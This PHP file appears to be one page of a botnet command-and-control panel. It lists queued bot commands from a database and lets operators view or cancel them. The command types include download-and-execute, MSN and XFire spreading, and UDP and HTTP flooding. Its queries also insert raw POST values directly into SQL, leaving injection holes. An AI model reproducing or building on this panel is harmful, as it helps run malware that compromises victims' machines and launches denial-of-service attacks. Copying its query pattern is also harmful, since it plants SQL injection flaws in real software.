<?php
	//check if included in project
	if ( !defined ( 'vnLoader' ) ) header ( 'location: ../' );
	
	//set variables
	$usr = $user['name'];

	//include
	include ( './include/function.php' ) ;

	if ( isset ( $_POST['command_id'] ) )
		{
		if ( $_POST['command_id'] == 'all' )
			{
			if ( instring( '' , $permission ) ) 
				{
				mysql_query("TRUNCATE commands");
				$page .= '				All commands cancelled.' . "\n";
				$page .= '				<br />' . "\n";
				$page .= '				<br />' . "\n";
				}
			}
		else
			{
			mysql_query("DELETE FROM commands WHERE id = '" . $_POST['command_id'] . "'");
			}
		}

	if ( isset ( $_POST['view_id'] ) )
		{
		$result = mysql_query("SELECT * FROM commands WHERE id='" . $_POST['view_id'] . "'");
		$rows = mysql_fetch_array($result);

		if ( $rows['cmd'] == 1 )
			{
			$command = "Download & Execute";
			}
		elseif ( $rows['cmd'] == 2 )
			{
			$command = "Update";
			}
		elseif ( $rows['cmd'] == 3 )
			{
			$command = "Remove";
			}
		elseif ( $rows['cmd'] == 4 )
			{
			$command = "Browse Website";
			}
		elseif ( $rows['cmd'] == 5 )
			{
			$command = "Visit Website";
			}
		elseif ( $rows['cmd'] == 6 )
			{
			$command = "MSN-Spread";
			}
		elseif ( $rows['cmd'] == 7 )
			{
			$command = "XFire-Spread";
			}
		elseif ( $rows['cmd'] == 8 )
			{
			$command = "UDP-Flood";
			}
		elseif ( $rows['cmd'] == 9 )
			{
			$command = "HTTP-Flood";
			}
		if ( $rows['cmd'] == 2 )
			{
			list($cmd_url , $cmd_pass) = split("[|]", $rows['param'], 2);
			$page .= '				<font color="#1b84ec">ID:</font>' . "\n";
			$page .= '				' . $rows['id'] . '<br><br>' . "\n";
			$page .= '				<div class="font">Command:</div>' . "\n";
			$page .= '				' . $command . '<br><br>' . "\n";
			$page .= '				<div class="font">Parameter:</div>' . "\n";
			$page .= '				' . $cmd_url . '|******<br><br>' . "\n";
			}
		elseif ( $rows['cmd'] == 3 )
			{
			$page .= '				<font color="#1b84ec">ID:</font>' . "\n";
			$page .= '				' . $rows['id'] . '<br><br>' . "\n";
			$page .= '				<div class="font">Command:</div>' . "\n";
			$page .= '				' . $command . '<br><br>' . "\n";
			$page .= '				<div class="font">Parameter:</div>' . "\n";
			$page .= '				******<br><br>' . "\n";
			}
		else	
			{
			$page .= '				<font color="#1b84ec">ID:</font>' . "\n";
			$page .= '				' . $rows['id'] . '<br><br>' . "\n";
			$page .= '				<div class="font">Command:</div>' . "\n";
			$page .= '				' . $command . '<br><br>' . "\n";
			$page .= '				<div class="font">Parameter:</div>' . "\n";
			$page .= '				' . $rows['param'] . '<br><br>' . "\n";
			}
		$page .= '				<img src="./images/dot.png" width="100%" height="1" /><br><br>' . "\n";
		}

	//start creating the table
	$page .= '				<table width="98%" class="center">' . "\n";
	$page .= '					<tr bgcolor="#E0E0E0">' . "\n";
	$page .= '						<td style="border: 1px solid">ID</td>' . "\n";
	$page .= '						<td style="border: 1px solid">Command</td>' . "\n";
	$page .= '						<td style="border: 1px solid">User</td>' . "\n";
	$page .= '						<td style="border: 1px solid">Parameter</td>' . "\n";
	$page .= '						<td style="border: 1px solid">Cancel</td>' . "\n";
	$page .= '					</tr>' . "\n";

	//sql function
	$result = mysql_query("SELECT * FROM commands");
	while($rows = mysql_fetch_array($result)) 
		{
		if ( $rows['cmd'] == 1 )
			{
			$command = "Download & Execute";
			}
		elseif ( $rows['cmd'] == 2 )
			{
			$command = "Update";
			}
		elseif ( $rows['cmd'] == 3 )
			{
			$command = "Remove";
			}
		elseif ( $rows['cmd'] == 4 )
			{
			$command = "Browse Website";
			}
		elseif ( $rows['cmd'] == 5 )
			{
			$command = "Visit Website";
			}
		elseif ( $rows['cmd'] == 6 )
			{
			$command = "MSN-Spread";
			}
		elseif ( $rows['cmd'] == 7 )
			{
			$command = "XFire-Spread";
			}
		elseif ( $rows['cmd'] == 8 )
			{
			$command = "UDP-Flood";
			}
		elseif ( $rows['cmd'] == 9 )
			{
			$command = "HTTP-FLood";
			}

		
		if ( instring( '' , $permission ) ) 
			{
			$page .= '					<tr>' . "\n";
			$page .= '						<td style="border-bottom: 1px dotted silver">' . $rows['id'] . '</td>' . "\n";
			$page .= '						<td style="border-bottom: 1px dotted silver">' . $command . '</td>' . "\n";
			$page .= '						<td style="border-bottom: 1px dotted silver">' . $rows['user'] . '</td>' . "\n";
			$page .= '						<td style="border-bottom: 1px dotted silver">' . "\n";
			$page .= '							<form action="index.php?pid=4" method="post">' . "\n";
			$page .= '								<input type="hidden" name="view_id" value="' . $rows['id'] . '" />' . "\n";
			$page .= '								<input type="submit" value="View" />' . "\n";
			$page .= '							</form>' . "\n";
			$page .= '						</td>' . "\n";
			$page .= '						<td style="border-bottom: 1px dotted silver">' . "\n";
			$page .= '							<form action="index.php?pid=4" method="post">' . "\n";
			$page .= '								<input type="hidden" name="command_id" value="' . $rows['id'] . '" />' . "\n";
			$page .= '								<input type="submit" value="Cancel" />' . "\n";
			$page .= '							</form>' . "\n";
			$page .= '						</td>' . "\n";
			$page .= '					</tr>' . "\n";
			}
		else 
			{
			if ( $rows['user'] == $user['name'] ) 
				{
				$page .= '					<tr>' . "\n";
				$page .= '						<td style="border-bottom: 1px dotted silver">' . $rows['id'] . '</td>' . "\n";
				$page .= '						<td style="border-bottom: 1px dotted silver">' . $command . '</td>' . "\n";
				$page .= '						<td style="border-bottom: 1px dotted silver">' . $rows['user'] . '</td>' . "\n";
				$page .= '						<td style="border-bottom: 1px dotted silver">' . "\n";
				$page .= '							<form action="index.php?pid=4" method="post">' . "\n";
				$page .= '								<input type="hidden" name="edit_id" value="' . $rows['id'] . '" />' . "\n";
				$page .= '								<input type="submit" value="Edit" />' . "\n";
				$page .= '							</form>' . "\n";
				$page .= '						</td>' . "\n";
				$page .= '						<td style="border-bottom: 1px dotted silver">' . "\n";
				$page .= '							<form action="index.php?pid=4" method="post">' . "\n";
				$page .= '								<input type="hidden" name="command_id" value="' . $rows['id'] . '" />' . "\n";
				$page .= '								<input type="submit" value="Cancel" />' . "\n";
				$page .= '							</form>' . "\n";
				$page .= '						</td>' . "\n";
				$page .= '					</tr>' . "\n";
				}
			}
		}

	//end table
	$page .= '				</table>' . "\n";
	
	if ( instring( '' , $permission ) ) 
		{
		$page .= '				<br />' . "\n";
		$page .= '				<form action="index.php?pid=4" method="post">' . "\n";
		$page .= '					<input type="hidden" name="command_id" value="all" />' . "\n";
		$page .= '					<input type="submit" value="Cancel All" />' . "\n";				
		$page .= '				</form>' . "\n";
		}
?>